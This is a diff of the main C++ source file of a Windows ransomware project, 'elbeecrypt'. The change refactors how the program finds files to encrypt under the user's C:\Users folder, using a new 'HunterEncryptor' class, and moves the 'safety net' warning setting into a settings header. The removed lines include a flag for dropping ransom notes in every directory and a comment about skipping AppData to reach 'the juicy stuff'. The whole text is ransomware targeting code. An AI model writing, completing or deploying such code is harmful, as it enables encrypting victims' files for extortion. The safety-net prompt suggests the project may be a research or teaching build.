@@ -3,14 +3,14 @@
 #include <iostream>
 #include <string>
 #include <vector>
+#include "elbeecrypt/cryptor/hunter-encryptor.hpp"
 #include "elbeecrypt/cryptor/main.hpp"
 
-#include <sodium.h>
-#include <typeinfo>
-
-#include "elbeecrypt/common/io/direntwalk.hpp"
+#include "elbeecrypt/common/settings.hpp"
 #include "elbeecrypt/common/targets/extensions.hpp"
+#include "elbeecrypt/common/utils/fs.hpp"
 #include "elbeecrypt/common/utils/string.hpp"
+
 
 //Platform-specific includes
 #if defined(_WIN32) || defined(__WIN32__) || defined(WIN32)
@@ -21,10 +21,6 @@
 #else
 	#error "This code is only meant to be compiled for Windows targets. Either cross-compile or build natively on Win-32."
 #endif
-
-//Configuration
-#define SAFETY_NET true //Whether there should be a warning before running
-#define SPAM_RANSOM_NOTES false //Whether there should be ransom notes dropped in every directory that the ransomware hit
 
 namespace fs = std::filesystem;
 using namespace elbeecrypt;
@@ -46,41 +42,36 @@ void writeTo(fs::path path, std::string content){
  */
 int main(int argc, char **argv){
 	//Deploy the safety net before continuing
-	#if SAFETY_NET == true
+	if(common::Settings::SAFETY_NET == true){
 		if(!cryptor::Main::safetyNet()) exit(-1);
-	#endif
+	}
 
 	cout << "Encryption routines started!" << endl;
 
-	std::cout << "Sodium: " << sodium_init() << std::endl;
 
-	vector<fs::path> paths = {};
-
-	//Define the lambda to collect the directory listings
-	auto fileConsumer = [&paths](const fs::path& path){
-		if(common::targets::Extensions::isEncryptable(path)){
-			paths.push_back(path);
-			std::cout << "Found encryptable file at " << path << std::endl;
-		}
-	};
-
-	auto folderConsumer = [](const fs::path& path){
-		//Skip "." directories and AppData (skipping straight to the juicy stuff)
-		if(path.filename().string()[0] == '.') return false;
-		if(common::utils::String::toLowercase(path.filename().string()) == "appdata") return false;
-		return true;
-	};
-
-	//Call the walk function with the root path and the lambda
-	std::string uname(getenv("username"));
-	common::io::DirentWalk::walk(fs::path("C:\\Users\\" + uname), fileConsumer, folderConsumer);
+	//Set the base path
+	const fs::path basePath("C:\\Users\\" + std::string(getenv("username")));
+	std::cout << "Path: " << basePath << std::endl;
 
 
+
+	cryptor::HunterEncryptor h = cryptor::HunterEncryptor({basePath});
+	//elbeecrypt::common::io::Hunter h({basePath});
+
+	std::cout << h.toString() << std::endl;
+
+	std::cout << "Targets:" << std::endl;
+	for(fs::path item : h.getTargets()){
+		std::cout << "\t" << item.string() << std::endl;
+	}
+
+
+
+	/*
 	for(fs::path path : paths){
 		writeTo(common::io::DirentWalk::pwd() / "test-paths.txt", path.string());
 	}
-
-	std::cout << ":)" << std::endl;
+	*/
 }
 
 /** Impl of safetyNet(). */
